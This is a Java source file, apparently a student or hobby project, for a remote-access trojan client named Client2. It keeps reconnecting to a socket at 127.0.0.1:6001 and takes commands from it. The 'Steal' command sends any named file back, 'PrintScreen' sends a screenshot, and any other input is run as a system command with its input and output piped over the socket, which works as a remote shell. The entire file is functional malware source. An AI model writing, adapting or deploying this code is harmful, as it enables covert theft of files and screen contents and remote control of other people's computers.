package cap.liubailin;
import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.ConnectException;
import java.net.Socket;
import java.net.SocketException;
import java.nio.channels.FileChannel;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

import javax.imageio.ImageIO;

public class Client2 {
	
	public static int BUFFSIZE = 0xFFFF;

	public static Boolean isAliveflag = true;
	
	public static Integer willCloseStream = 0;//当标准流和错误流都输出完成了是就置为2
	
	public static void steal(String filename, OutputStream os) {
		File f = new File(filename);
		FileInputStream fis = null;
		try {
			byte [] buf = new byte [BUFFSIZE];
			fis = new FileInputStream(f);
			int c = -1;
			try {
				while((c = fis.read(buf,0,BUFFSIZE)) != -1) {
					os.write(buf,0,c);
					os.flush();

				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}
	}
	
	public static void prtsc(OutputStream os) {
	    Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = null;
		try {
			robot = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
        BufferedImage image = robot.createScreenCapture(screenRectangle);
          
        try {
			ImageIO.write(image, "png", os);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	
	public static void dispatchComm(OutputStream os,InputStream is) { 
		
      	Scanner s = new Scanner(is);
    	
	    Log.write("before exec", "****");
	    String comm = s.nextLine();
	    Log.write("before exec", comm);

		String sub[] =  comm.split(" ");
		
		switch(sub[0]) {
			case "Steal":
				steal(sub[1],os);
			break;
			case "PrintScreen":
				prtsc(os);
			break;
			default :
				execCommand(comm,os,is);
		}
		
		Log.write("abfer exec ", comm);
		s.close();
	}
	
	
	
	public static void execCommand(String alert,OutputStream os, InputStream is) {
		String command = alert;
		
		if(alert == null || alert.equals(""))
			command = "help ";
		
        try {

	         Process process = Runtime.getRuntime().exec(command);
	         
	         InputStream err  = process.getErrorStream();
	         InputStream res = process.getInputStream();
	         OutputStream outProcess = process.getOutputStream();
		    	
	        byte [] buf = new byte[BUFFSIZE];
		    byte [] buferr = new byte[BUFFSIZE];
			     
		    byte [] bufcomm = new byte[BUFFSIZE];
		     willCloseStream = 0;
		    //Client1<<err
    		 new Thread(){
					
					@Override
					public void run() { 
						try { 
							int c = -1;
							while((c = err.read(buferr,0,BUFFSIZE)) != -1) {
								os.write(buferr,0,c);
								os.flush();
							
							}
							synchronized (willCloseStream) {
								if(willCloseStream != 0) {
									os.close();
									Log.write("Close", "close outputStream in Client1<<err");
								}
								willCloseStream ++;	
							}
							
						} catch (IOException e) {
							Log.write("Warn", "closer output in standard outstream by exception:"+e.getMessage());
							willCloseStream ++;
						}	
					}
				}.start();
	    		
    		 	//Client1<<out
	    		 new Thread(){
					@Override
					public void run() { 
						try { 
							int c = -1;
							
							while((c = res.read(buf,0,BUFFSIZE)) != -1) {
								os.write(buf,0,c);
								os.flush();
							}
							
							synchronized (willCloseStream) {
								if(willCloseStream != 0) {
									os.close();
									Log.write("Close", "close outputStream in Client1<<out:");
								}
								willCloseStream ++;
							}
							
						} catch (IOException e) {
							Log.write("Warn", "closer output in errStream by exception:"+e.getMessage());
							willCloseStream ++;
						}	
					}
				}.start();
	    		 
	    		 
	    		//Client1 >> command
	    		Thread inThread = new Thread() {
					
					@Override
					public void run() {
							try {
								int c = -1;
								 
								while((c = is.read(bufcomm,0,BUFFSIZE)) != -1) {
									
									synchronized (willCloseStream) {
										if(willCloseStream >= 2) {
											break;
										}
									}
									outProcess.write(bufcomm,0,c);
									outProcess.flush();
									isAliveflag = true;
								}
							}catch(SocketException e) {
								Log.write("Notice", "client have finshed");
							}catch (IOException e) {
								e.printStackTrace();
							}
							
					}
				};
				inThread.start();
				
				//监控运行命令是否处于死循环中
	    		Thread controlThread = new Thread() {
					
					@Override
					public void run() {
						int count = 0;
						while(!this.isInterrupted()) {
								if(isAliveflag) {
									isAliveflag = false;
									count = 0;
								}
							
							try {
								Thread.sleep(1000);
							} catch (InterruptedException e) {
								this.interrupt();
							}
							count ++;
							if(count >10) {
								process.destroy();
								Log.write("kill", "subProcess is killed");
							}
						}
					}
				};
	    		controlThread.start();
				
	     	 System.out.println("befor waitFor ....");
	         process.waitFor(); 
	         controlThread.interrupt();
	         System.out.println("after waitFor");
	         
	       
     } catch (IOException e) {
         e.printStackTrace();
     } catch (InterruptedException e) {
         e.printStackTrace();
     }catch(IllegalThreadStateException e) {
    	 e.printStackTrace();
    	 Log.write("exception", "Command have not finshed.\n");
     }catch(Exception e) { 
    	 e.printStackTrace();
    	 Log.write("err", "Other Exception that I don't know.\n");
     }
       
	}
	

	public static void main(String[] args) {
		while(true)
			try {
				Socket socket2 = new Socket("127.0.0.1", 6001);
				OutputStream os = socket2.getOutputStream();
				InputStream is = socket2.getInputStream();
				
	
		    	dispatchComm(os,is);
		   
			}catch(ConnectException e) {
				Log.write("exception", e.getMessage());
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e1) {
					e1.printStackTrace();
				}
			}catch (Exception e) {
				e.printStackTrace();
			}
	}
}
